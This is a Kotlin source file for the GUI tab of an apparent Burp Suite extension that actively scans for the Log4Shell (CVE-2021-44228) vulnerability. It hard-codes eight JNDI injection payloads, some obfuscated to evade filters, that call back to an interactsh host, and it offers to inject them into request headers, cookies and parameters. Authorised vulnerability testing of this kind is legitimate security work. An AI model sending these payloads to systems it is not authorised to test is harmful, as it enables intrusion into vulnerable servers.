package com.dexter0us.log4jScanner

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.swing.Swing
import net.miginfocom.swing.MigLayout
import java.awt.*
import java.awt.event.ActionEvent
import java.awt.event.ActionListener
import java.awt.event.FocusEvent
import java.awt.event.FocusListener
import java.awt.image.BufferedImage
import java.net.URI
import javax.swing.*

class Log4JTab: JPanel(), ActionListener {



    private val list = arrayOf(
        "\${jndi:ldap://example.interactsh.com/random-string}",
        "\${jndi:\${lower:l}\${lower:d}a\${lower:p}://example.interactsh.com/random-string}",
        "\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-r}\${::-m}\${::-i}://example.interactsh.com/random-string}",
        "\${\${::-j}ndi:rmi://example.interactsh.com/random-string}",
        "\${jndi:rmi://example.interactsh.com/random-string}",
        "\${\${lower:jndi}:\${lower:rmi}://example.interactsh.com/random-string}",
        "\${\${lower:\${lower:jndi}}:\${lower:rmi}://example.interactsh.comn/random-string}",
        "\${\${env:FOOBAR:-j}ndi\${env:FOOBAR:-:}\${env:FOOBAR:-l}dap\${env:FOOBAR:-:}//example.interactsh.com/random-string}",
        "Add custom payload."
    )
    internal val dnsTokenTextBox = JTextField()
    internal val payloadComboBox = JComboBox(list)
    internal val customPayloadTextBox = JTextField()
    private val headerCheckBox = JCheckBox()
    private val paramsCheckBox = JCheckBox()
    internal val authCheckBox = JCheckBox()
    internal val authTextBox = JTextField()
    private var scanButton = JButton()
    private var cancelButton = JButton()
    private val progressBar = JProgressBar()

    private var twitterButton = JButton()
    private var githubButton = JButton()
    private var blogButton = JButton()
    private var kofiButton = JButton()


    init {
        //      Top Panel (Header) ============================================================

        val heading = JLabel().apply {
            text = "Log4J Scanner"
            font = font.deriveFont(32f).deriveFont(Font.BOLD)
        }

        val tagline = JLabel().apply {
            text = "Log4Shell (CVE-2021-44228) vulnerability active scanner."
            font = font.deriveFont(16f).deriveFont(Font.ITALIC)
        }

        //      Main Panel (Body) =============================================================

        payloadComboBox.addActionListener(this)

        dnsTokenTextBox.apply {
            val demoText = "example.interactsh.com"
            addFocusListener(object : FocusListener {
                override fun focusGained(e: FocusEvent) {
                    if (text != demoText) {/**/
                    } else text = ""
                }

                override fun focusLost(e: FocusEvent) =
                    if (text != demoText) {/**/
                    } else text = demoText
            })
        }

        headerCheckBox.apply {
            text = "Insert payload in Origin, Referer, User-Agent headers"
            isFocusable = false
            isSelected = true
        }

        paramsCheckBox.apply {
            text = "Insert payload in Cookie, Body and URL parameters."
            isFocusable = false
            isSelected = true
        }

        authCheckBox.apply {
            text = "Add authentication cookie or auth token"
            isFocusable = false
            isSelected = false
        }
        authCheckBox.addActionListener(this)

        authTextBox.isEnabled = false
        cancelButton.isEnabled = false

        val scanImage = loadImage("htp.png")
        when {
            scanImage != null -> {
                scanButton = JButton("Hack The Planet!!!", scanImage)
                scanButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                scanButton.iconTextGap = 3
            }
            else -> scanButton = JButton("Hack The Planet!!!")
        }
        scanButton.addActionListener(this)

        val cancelImage = loadImage("cancel.png")
        when {
            cancelImage != null -> {
                cancelButton = JButton("Cancel", cancelImage)
                cancelButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                cancelButton.iconTextGap = 3
            }
            else -> cancelButton = JButton("Cancel")
        }
        cancelButton.addActionListener(this)



        //      Contact Panel (Footer) ========================================================

        val twitterImage = loadImage("twitter.png")
        when {
            twitterImage != null -> {
                twitterButton = JButton("Follow me on Twitter", twitterImage)
                twitterButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                twitterButton.iconTextGap = 3
            }
            else -> twitterButton = JButton("Follow me on Twitter")
        }
        twitterButton.addActionListener(this)


        val githubImage = loadImage("github.png")
        when {
            githubImage != null -> {
                githubButton = JButton("View Project on Github", githubImage)
                githubButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                githubButton.iconTextGap = 3
            }
            else -> githubButton = JButton("View Project on Github")
        }
        githubButton.addActionListener(this)


        val blogImage = loadImage("blog.png")
        when {
            blogImage != null -> {
                blogButton = JButton("Checkout my Blog", blogImage)
                blogButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                blogButton.iconTextGap = 3
            }
            else -> blogButton = JButton("Checkout my Blog")
        }
        blogButton.addActionListener(this)


        val kofiImage = loadImage("ko-fi.png")
        when {
            kofiImage != null -> {
                kofiButton = JButton("Support Project on Ko-Fi", kofiImage)
                kofiButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                kofiButton.iconTextGap = 3
            }
            else -> kofiButton = JButton("Buy me a Coffee")
        }
        kofiButton.addActionListener(this)


        val northPanel = JPanel().apply {
            layout = MigLayout("align center")
            border = BorderFactory.createEmptyBorder(5, 5, 5, 5)
            add(heading, "bottom, center, span, wrap")
            add(tagline, "top, center, span, wrap")
        }

        val mainPanel = JPanel().apply {
            layout = MigLayout("align center")
            border = BorderFactory.createEmptyBorder(5, 5, 5, 5)

            add(JLabel("DNS Token:"), "right")
            add(dnsTokenTextBox, "span, growx, wrap, h 30!")
            add(JLabel("Add DNS Token/Collaborator link of any service eg: interactsh.com, canarytokens.org, pipedream.com, dnslog.cn, burp collaborator"), "left, wrap, growx, span")
            add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
            add(JLabel("Payload:"), "right")
            add(payloadComboBox, "span, growx, wrap, h 30!")
            add(JLabel("Custom Payload:"), "right")
            add(customPayloadTextBox, "span, growx, wrap, h 30!")
            add(JLabel("Provide a custom payload with placeholders \"[dnsToken]\" and \"[random]\". Eg: \"\${jndi:ldap://[dnsToken]/[random]}\""), "left, wrap, growx, span")
            add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
            add(JSeparator(SwingConstants.HORIZONTAL), "")
            add(headerCheckBox,"left, wrap")
            add(JSeparator(SwingConstants.HORIZONTAL), "")
            add(paramsCheckBox,"left, wrap")
            add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
            add(JSeparator(SwingConstants.HORIZONTAL), "")
            add(authCheckBox,"left, wrap")
            add(JLabel("Add Cookie or Auth Token:"), "right")
            add(authTextBox, "span, growx, wrap, h 30!")
            add(JLabel("Add complete auth/cookie header. Eg \"Authorization: Bearer ya29.m.CvkBAd1XLWYfLkuHFIuOYFCfcGI137rr...\""),"left, wrap, growx, span")
            add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
            add(JSeparator(SwingConstants.HORIZONTAL), "")
            add(scanButton, "right, w 250!, h 35!")
            add(cancelButton,"left, wrap, w 150!, h 35!")
            add(progressBar, "span, center, growx, h 20!")

        }

        val southPanel = JPanel().apply {
            layout = MigLayout("align center")
            border = BorderFactory.createEmptyBorder(2, 0, 10, 0)

            add(JLabel("Crafted with <3 by Dexter0us"), "span, align center, wrap")
            add(twitterButton, "w 230!, h 35!")
            add(githubButton, "w 230!, h 35!, wrap")
            add(blogButton, "w 230!, h 35!")
            add(kofiButton, "w 230!, h 35!, wrap")
        }

        layout = MigLayout("align center")
        setSize(600,1000)
        add(northPanel, "dock north")
        add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
        add(mainPanel, "wrap, align center")
        add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
        add(southPanel, "dock south")

    }



    override fun actionPerformed(e: ActionEvent?) {
        when (e?.source) {
            payloadComboBox -> {
                when (payloadComboBox.selectedIndex) {
                    8 -> customPayloadTextBox.isEnabled = true
                    else -> {
                        customPayloadTextBox.isEnabled = false
                    }
                }
            }
            authCheckBox -> {
                authTextBox.isEnabled = authCheckBox.isSelected
            }
            scanButton -> {
                when {
                    !headerCheckBox.isSelected && !paramsCheckBox.isSelected -> alertBox("Select at least one payload insertion location.")

                    payloadComboBox.selectedIndex == 8 && customPayloadTextBox.text == "" -> alertBox("Enter custom payload or select any one payload.")

                    dnsTokenTextBox.text == "" -> alertBox("Add a DNS token.")

                    authCheckBox.isSelected && authTextBox.text == "" -> alertBox("Add cookie or auth token otherwise deselect the auth-checkbox")

                    else -> {
                        progressBar.value = 0
                        scanButton.isEnabled = false
                        cancelButton.isEnabled = true
                        cursor = Cursor.getPredefinedCursor(Cursor.WAIT_CURSOR)
                        GlobalScope.launch(Dispatchers.Swing) {
                            currJob?.cancel()

                            val processResult = Log4JScanner().scanner(
                                dnsTokenTextBox.text,
                                payloadComboBox.selectedIndex,
                                customPayloadTextBox.text,
                                headerCheckBox.isSelected,
                                paramsCheckBox.isSelected,
                                authTextBox.text
                            )
                            currJob = processResult.job
                            for (y in processResult.resultChannel) {
                                progressBar.maximum = historySize - 5
                                progressBar.value = y
                            }
                            progressBar.value = historySize
                            scanButton.isEnabled = true
                            cancelButton.isEnabled = false
                            cursor = Cursor.getDefaultCursor()
                        }
                    }
                }
            }
            cancelButton -> {
                currJob?.cancel()
                scanButton.isEnabled = true
                cancelButton.isEnabled = false
                cursor = Cursor.getDefaultCursor()
            }
            twitterButton -> openInBrowser("https://twitter.com/0xDexter0us")
            githubButton -> openInBrowser("https://github.com/0xDexter0us/Scavenger")
            blogButton -> openInBrowser("https://dexter0us.com/")
            kofiButton -> openInBrowser("https://ko-fi.com/dexter0us")

        }
    }

    // Credits to CoreyD97 for this idea and function
    private fun loadImage(filename: String): ImageIcon? {
        val cldr = this.javaClass.classLoader
        val imageURLMain = cldr.getResource(filename)
        if (imageURLMain != null) {
            val scaled = ImageIcon(imageURLMain).image.getScaledInstance(30, 30, Image.SCALE_SMOOTH)
            val scaledIcon = ImageIcon(scaled)
            val bufferedImage = BufferedImage(30, 30, BufferedImage.TYPE_INT_ARGB)
            val g = bufferedImage.graphics as Graphics2D
            g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON)
            g.drawImage(scaledIcon.image, null, null)
            return ImageIcon(bufferedImage)
        }
        return null
    }

    private fun alertBox(str: String) {
        JOptionPane.showMessageDialog(this, str, "Log4J Scanner", JOptionPane.PLAIN_MESSAGE)
    }

    private fun openInBrowser(url: String) {
        if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
            Desktop.getDesktop().browse(URI(url))
        } else {
            alertBox("Unable to open browser.\n Visit: $url")
        }
    }

}
